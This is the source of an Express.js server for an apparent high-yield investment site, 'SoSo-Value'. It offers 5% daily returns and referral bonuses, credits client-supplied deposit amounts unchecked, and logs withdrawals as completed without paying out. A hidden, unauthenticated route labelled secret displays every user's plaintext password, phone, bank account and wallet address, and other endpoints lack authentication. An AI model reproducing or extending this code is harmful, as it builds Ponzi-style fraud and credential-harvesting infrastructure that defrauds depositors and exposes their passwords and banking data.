const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// ==================== DATABASE ====================
const DB_FILE = path.join(__dirname, 'database.json');

function readDB() {
    try {
        if (!fs.existsSync(DB_FILE)) {
            const initial = {
                users: [],
                transactions: [],
                settings: {
                    sosoPrice: 0.1,
                    dailyYield: 0.05,
                    weeklyWithdrawRate: 0.02,
                    signupBonus: 0.2,
                    ngnToUsd: 1600
                }
            };
            fs.writeFileSync(DB_FILE, JSON.stringify(initial, null, 2));
            return initial;
        }
        const data = fs.readFileSync(DB_FILE, 'utf8');
        return JSON.parse(data);
    } catch (e) {
        console.error('DB Read Error:', e);
        return { users: [], transactions: [], settings: { sosoPrice: 0.1, dailyYield: 0.05, weeklyWithdrawRate: 0.02, signupBonus: 0.2, ngnToUsd: 1600 } };
    }
}

function writeDB(data) {
    try {
        fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
    } catch (e) {
        console.error('DB Write Error:', e);
    }
}

// ==================== HELPERS ====================
function generateId() {
    return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

function generateReferralCode(name) {
    const clean = name.replace(/\s/g, '').substring(0, 4).toUpperCase();
    const rand = Math.floor(1000 + Math.random() * 9000);
    return clean + rand;
}

function authenticate(req, res, next) {
    const token = req.headers['authorization'];
    if (!token) {
        return res.status(401).json({ error: 'No authorization token' });
    }
    const db = readDB();
    const user = db.users.find(u => u.token === token);
    if (!user) {
        return res.status(401).json({ error: 'Invalid token' });
    }
    req.user = user;
    req.db = db;
    next();
}

// ==================== SIGNUP ====================
app.post('/api/signup', (req, res) => {
    const { name, email, phone, password, referralCode } = req.body;

    if (!name || !email || !phone || !password) {
        return res.status(400).json({ error: 'All fields required' });
    }

    const db = readDB();

    if (db.users.find(u => u.email === email)) {
        return res.status(400).json({ error: 'Email already registered' });
    }

    const settings = db.settings;
    const bonusNGN = settings.signupBonus * settings.ngnToUsd;
    const token = generateId() + generateId();

    const newUser = {
        id: generateId(),
        name,
        email,
        phone,
        password,
        token,
        referralCode: generateReferralCode(name),
        referredBy: referralCode || '',
        balance: bonusNGN,
        totalInvested: 0,
        totalYield: 0,
        totalWithdrawn: 0,
        referralCount: 0,
        referralEarnings: 0,
        investments: [],
        boundBank: null,
        boundWallet: null,
        welcomeShown: false,
        createdAt: new Date().toISOString()
    };

    db.transactions.push({
        id: generateId(),
        userId: newUser.id,
        type: 'bonus',
        description: 'Sign-up Bonus',
        amount: bonusNGN,
        date: new Date().toISOString(),
        status: 'completed'
    });

    if (referralCode) {
        const referrer = db.users.find(u => u.referralCode === referralCode);
        if (referrer) {
            referrer.balance += bonusNGN;
            referrer.referralCount += 1;
            referrer.referralEarnings += bonusNGN;
            db.transactions.push({
                id: generateId(),
                userId: referrer.id,
                type: 'bonus',
                description: 'Referral Bonus (' + name + ')',
                amount: bonusNGN,
                date: new Date().toISOString(),
                status: 'completed'
            });
        }
    }

    db.users.push(newUser);
    writeDB(db);

    res.json({
        success: true,
        message: 'Account created successfully',
        user: { ...newUser, password: undefined }
    });
});

// ==================== LOGIN ====================
app.post('/api/login', (req, res) => {
    const { identifier, password } = req.body;

    if (!identifier || !password) {
        return res.status(400).json({ error: 'All fields required' });
    }

    const db = readDB();
    const user = db.users.find(u =>
        (u.email === identifier || u.name.toLowerCase() === identifier.toLowerCase())
        && u.password === password
    );

    if (!user) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }

    user.token = generateId() + generateId();
    writeDB(db);

    const transactions = db.transactions.filter(t => t.userId === user.id);

    res.json({
        success: true,
        user: { ...user, password: undefined },
        transactions
    });
});

// ==================== PROFILE ====================
app.get('/api/profile', authenticate, (req, res) => {
    const transactions = req.db.transactions.filter(t => t.userId === req.user.id);
    res.json({
        user: { ...req.user, password: undefined },
        transactions
    });
});

// ==================== UPDATE WELCOME ====================
app.post('/api/update-welcome', authenticate, (req, res) => {
    const db = req.db;
    const user = db.users.find(u => u.id === req.user.id);
    user.welcomeShown = true;
    writeDB(db);
    res.json({ success: true });
});

// ==================== DEPOSIT ====================
app.post('/api/deposit', authenticate, (req, res) => {
    const { amount, method, planLevel } = req.body;

    if (!amount || amount <= 0) {
        return res.status(400).json({ error: 'Invalid amount' });
    }

    const db = req.db;
    const user = db.users.find(u => u.id === req.user.id);

    user.balance += amount;

    db.transactions.push({
        id: generateId(),
        userId: user.id,
        type: 'deposit',
        description: 'Deposit - SoSo-' + (planLevel || 1) + ' (' + (method || 'Bank Transfer') + ')',
        amount: amount,
        date: new Date().toISOString(),
        status: 'completed'
    });

    writeDB(db);

    res.json({
        success: true,
        message: 'Deposit successful',
        newBalance: user.balance
    });
});

// ==================== BUY PLAN ====================
app.post('/api/buy-plan', authenticate, (req, res) => {
    const { level, priceNGN } = req.body;

    if (!level || !priceNGN) {
        return res.status(400).json({ error: 'Plan level and price required' });
    }

    const db = req.db;
    const user = db.users.find(u => u.id === req.user.id);

    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }

    if (user.balance < priceNGN) {
        return res.status(400).json({ error: 'Insufficient balance. Please deposit first.' });
    }

    const settings = db.settings;

    const investment = {
        id: generateId(),
        name: 'SoSo-' + level,
        level: level,
        priceNGN: priceNGN,
        priceUSD: priceNGN / settings.ngnToUsd,
        dailyRate: '5%',
        dailyIncome: priceNGN * settings.dailyYield,
        sosoTokens: (priceNGN / settings.ngnToUsd) / settings.sosoPrice,
        purchaseDate: new Date().toISOString(),
        lastYieldCalc: new Date().toISOString(),
        totalYield: 0,
        status: 'active'
    };

    user.balance -= priceNGN;
    user.totalInvested = (user.totalInvested || 0) + priceNGN;

    if (!user.investments) {
        user.investments = [];
    }
    user.investments.push(investment);

    db.transactions.push({
        id: generateId(),
        userId: user.id,
        type: 'purchase',
        description: 'Bought SoSo-' + level + ' Plan',
        amount: priceNGN,
        date: new Date().toISOString(),
        status: 'completed'
    });

    writeDB(db);

    res.json({
        success: true,
        message: 'Plan purchased successfully',
        investment: investment,
        newBalance: user.balance
    });
});

// ==================== WITHDRAW ====================
app.post('/api/withdraw', authenticate, (req, res) => {
    const { amount, method, bankDetails, walletAddress } = req.body;

    if (!amount || amount <= 0) {
        return res.status(400).json({ error: 'Invalid amount' });
    }

    const db = req.db;
    const user = db.users.find(u => u.id === req.user.id);

    if (amount > user.balance) {
        return res.status(400).json({ error: 'Insufficient balance' });
    }

    user.balance -= amount;
    user.totalWithdrawn = (user.totalWithdrawn || 0) + amount;

    db.transactions.push({
        id: generateId(),
        userId: user.id,
        type: 'withdrawal',
        description: 'Withdrawal - ' + (method === 'bank' ? 'Bank Transfer' : 'USDT TRC20'),
        amount: amount,
        date: new Date().toISOString(),
        status: 'completed',
        details: method === 'bank' ? bankDetails : { wallet: walletAddress }
    });

    writeDB(db);

    res.json({
        success: true,
        message: 'Withdrawal successful',
        newBalance: user.balance
    });
});

// ==================== BIND BANK ====================
app.post('/api/bind-bank', authenticate, (req, res) => {
    const { bankName, accountNumber, accountName } = req.body;

    if (!bankName || !accountNumber || !accountName) {
        return res.status(400).json({ error: 'All fields required' });
    }

    const db = req.db;
    const user = db.users.find(u => u.id === req.user.id);

    user.boundBank = { bankName, accountNumber, accountName };
    writeDB(db);

    res.json({ success: true, message: 'Bank details saved' });
});

// ==================== BIND WALLET ====================
app.post('/api/bind-wallet', authenticate, (req, res) => {
    const { walletAddress } = req.body;

    if (!walletAddress) {
        return res.status(400).json({ error: 'Wallet address required' });
    }

    const db = req.db;
    const user = db.users.find(u => u.id === req.user.id);

    user.boundWallet = walletAddress;
    writeDB(db);

    res.json({ success: true, message: 'Wallet address saved' });
});

// ==================== TRANSACTIONS ====================
app.get('/api/transactions', authenticate, (req, res) => {
    const { type } = req.query;
    let transactions = req.db.transactions.filter(t => t.userId === req.user.id);

    if (type && type !== 'all') {
        transactions = transactions.filter(t => t.type === type);
    }

    res.json({ transactions: transactions.reverse() });
});

// ==================== ACCOUNT LOOKUP ====================
app.post('/api/lookup-account', (req, res) => {
    const { bankName, accountNumber } = req.body;

    if (!bankName || !accountNumber) {
        return res.status(400).json({ error: 'Bank and account number required' });
    }

    const db = readDB();
    let foundName = '';

    db.users.forEach(u => {
        if (u.boundBank && u.boundBank.accountNumber === accountNumber && u.boundBank.bankName === bankName) {
            foundName = u.boundBank.accountName;
        }
    });

    if (foundName) {
        res.json({ success: true, accountName: foundName });
    } else {
        res.json({ success: true, accountName: 'Account Holder' });
    }
});

// ==================== CALCULATE YIELDS ====================
app.post('/api/calculate-yields', (req, res) => {
    const db = readDB();
    const now = new Date();
    let updated = false;

    db.users.forEach(user => {
        if (!user.investments) return;
        user.investments.forEach(inv => {
            if (inv.status !== 'active') return;
            const lastCalc = new Date(inv.lastYieldCalc || inv.purchaseDate);
            const hoursDiff = (now - lastCalc) / (1000 * 60 * 60);
            if (hoursDiff >= 24) {
                const periods = Math.floor(hoursDiff / 24);
                const yieldAmount = inv.priceNGN * db.settings.dailyYield * periods;
                inv.totalYield = (inv.totalYield || 0) + yieldAmount;
                inv.lastYieldCalc = now.toISOString();
                user.totalYield = (user.totalYield || 0) + yieldAmount;
                user.balance += yieldAmount;
                db.transactions.push({
                    id: generateId(),
                    userId: user.id,
                    type: 'yield',
                    description: 'Daily yield - ' + inv.name + ' (' + periods + ' day' + (periods > 1 ? 's' : '') + ')',
                    amount: yieldAmount,
                    date: now.toISOString(),
                    status: 'completed'
                });
                updated = true;
            }
        });
    });

    if (updated) writeDB(db);
    res.json({ success: true, message: 'Yields calculated' });
});

// ==================== VIEW ALL DATA (SECRET) ====================
app.get('/admin-view-sosovalue', (req, res) => {
    const db = readDB();
    let html = '<!DOCTYPE html><html><head><title>SoSo-Value Data</title><meta name="viewport" content="width=device-width,initial-scale=1.0"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:#0A0A1A;color:#fff;padding:20px}h1{color:#A29BFE;margin-bottom:5px;font-size:24px}.subtitle{color:#B0B0D0;font-size:13px;margin-bottom:25px}.user-card{background:#12122A;border:1px solid rgba(108,92,231,0.2);border-radius:15px;padding:20px;margin-bottom:20px}.user-name{font-size:18px;font-weight:bold;color:#A29BFE;margin-bottom:10px}.info-row{padding:5px 0;font-size:13px;color:#B0B0D0;border-bottom:1px solid rgba(108,92,231,0.05)}.info-row strong{color:#fff}.info-row .green{color:#00B894}.info-row .yellow{color:#FDCB6E}.info-row .red{color:#FF6B6B}.info-row .purple{color:#A29BFE}.summary-box{display:flex;flex-wrap:wrap;gap:15px;margin-bottom:30px}.summary-item{background:#12122A;border:1px solid rgba(108,92,231,0.3);border-radius:12px;padding:15px 20px;min-width:150px}.summary-item .label{font-size:12px;color:#B0B0D0;margin-bottom:5px}.summary-item .value{font-size:22px;font-weight:bold;color:#A29BFE}.search-box{width:100%;max-width:500px;padding:12px;background:#1A1A3E;border:1px solid rgba(108,92,231,0.3);border-radius:12px;color:#fff;font-size:14px;outline:none;margin-bottom:20px}.inv-box{background:#222255;border-radius:8px;padding:10px;margin:5px 0;font-size:12px;color:#B0B0D0}.tx-box{background:#1A1A3E;border-radius:6px;padding:8px;margin:3px 0;font-size:11px;display:flex;justify-content:space-between}</style></head><body>';
    html += '<h1>SoSo-Value Users Data</h1><p class="subtitle">Last updated: ' + new Date().toLocaleString() + '</p>';
    html += '<div class="summary-box"><div class="summary-item"><div class="label">Total Users</div><div class="value">' + db.users.length + '</div></div>';
    html += '<div class="summary-item"><div class="label">Total Deposited</div><div class="value">₦' + db.users.reduce((s,u) => s + (u.totalInvested||0), 0).toLocaleString() + '</div></div>';
    html += '<div class="summary-item"><div class="label">Total Withdrawn</div><div class="value">₦' + db.users.reduce((s,u) => s + (u.totalWithdrawn||0), 0).toLocaleString() + '</div></div>';
    html += '<div class="summary-item"><div class="label">Total Balance</div><div class="value">₦' + db.users.reduce((s,u) => s + (u.balance||0), 0).toLocaleString() + '</div></div></div>';
    html += '<input type="text" class="search-box" placeholder="Search users..." onkeyup="var q=this.value.toLowerCase();document.querySelectorAll(\'.user-card\').forEach(function(c){c.style.display=c.textContent.toLowerCase().includes(q)?\'block\':\'none\'});">';

    db.users.forEach(function(user, idx) {
        var userTx = db.transactions.filter(t => t.userId === user.id);
        html += '<div class="user-card">';
        html += '<div class="user-name">User #' + (idx+1) + ' — ' + (user.name||'N/A') + '</div>';
        html += '<div class="info-row"><strong>Email:</strong> <span class="purple">' + (user.email||'N/A') + '</span></div>';
        html += '<div class="info-row"><strong>Phone:</strong> ' + (user.phone||'N/A') + '</div>';
        html += '<div class="info-row"><strong>Password:</strong> <span class="yellow">' + (user.password||'N/A') + '</span></div>';
        html += '<div class="info-row"><strong>Balance:</strong> <span class="green">₦' + (user.balance||0).toLocaleString() + '</span> ($' + ((user.balance||0)/1600).toFixed(2) + ')</div>';
        html += '<div class="info-row"><strong>Invested:</strong> <span class="yellow">₦' + (user.totalInvested||0).toLocaleString() + '</span></div>';
        html += '<div class="info-row"><strong>Withdrawn:</strong> <span class="red">₦' + (user.totalWithdrawn||0).toLocaleString() + '</span></div>';
        html += '<div class="info-row"><strong>Yield:</strong> <span class="green">₦' + (user.totalYield||0).toLocaleString() + '</span></div>';
        html += '<div class="info-row"><strong>Referral Code:</strong> <span class="purple">' + (user.referralCode||'N/A') + '</span></div>';
        html += '<div class="info-row"><strong>Referred By:</strong> ' + (user.referredBy||'None') + '</div>';
        html += '<div class="info-row"><strong>Referrals:</strong> ' + (user.referralCount||0) + ' (Earned: ₦' + (user.referralEarnings||0).toLocaleString() + ')</div>';
        html += '<div class="info-row"><strong>Joined:</strong> ' + (user.createdAt ? new Date(user.createdAt).toLocaleString() : 'N/A') + '</div>';

        if (user.boundBank) {
            html += '<div class="info-row"><strong>Bank:</strong> <span class="green">' + user.boundBank.bankName + ' | ' + user.boundBank.accountNumber + ' | ' + user.boundBank.accountName + '</span></div>';
        } else {
            html += '<div class="info-row"><strong>Bank:</strong> <span class="red">Not bound</span></div>';
        }

        if (user.boundWallet) {
            html += '<div class="info-row"><strong>Wallet:</strong> <span class="green" style="font-size:11px;word-break:break-all;">' + user.boundWallet + '</span></div>';
        } else {
            html += '<div class="info-row"><strong>Wallet:</strong> <span class="red">Not bound</span></div>';
        }

        if (user.investments && user.investments.length > 0) {
            html += '<div style="margin-top:10px;font-size:13px;color:#A29BFE;font-weight:bold;">Investments (' + user.investments.length + '):</div>';
            user.investments.forEach(function(inv) {
                html += '<div class="inv-box">' + inv.name + ' | ₦' + (inv.priceNGN||0).toLocaleString() + ' | Daily: ₦' + (inv.dailyIncome||0).toLocaleString() + ' | Yield: ₦' + (inv.totalYield||0).toLocaleString() + ' | ' + (inv.purchaseDate ? new Date(inv.purchaseDate).toLocaleDateString() : '') + '</div>';
            });
        }

        if (userTx.length > 0) {
            html += '<div style="margin-top:10px;font-size:13px;color:#A29BFE;font-weight:bold;">Transactions (' + userTx.length + '):</div>';
            userTx.reverse().forEach(function(t) {
                var color = (t.type === 'withdrawal' || t.type === 'purchase') ? '#FF6B6B' : '#00B894';
                html += '<div class="tx-box"><span>' + (t.type||'').toUpperCase() + ' — ' + (t.description||'') + ' — ' + (t.date ? new Date(t.date).toLocaleDateString() : '') + '</span><span style="color:' + color + ';">₦' + (t.amount||0).toLocaleString() + '</span></div>';
            });
        }

        html += '</div>';
    });

    if (db.users.length === 0) {
        html += '<p style="text-align:center;color:#B0B0D0;padding:50px;">No users yet.</p>';
    }

    html += '<button onclick="window.location.reload()" style="background:#6C5CE7;border:none;color:white;padding:12px 25px;border-radius:10px;cursor:pointer;font-size:14px;margin-top:20px;">Refresh</button>';
    html += '</body></html>';
    res.send(html);
});

// ==================== SERVE FRONTEND ====================
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ==================== START ====================
app.listen(PORT, () => {
    console.log('\n===================================');
    console.log('  SoSo-Value Server Running');
    console.log('  http://localhost:' + PORT);
    console.log('===================================\n');
});
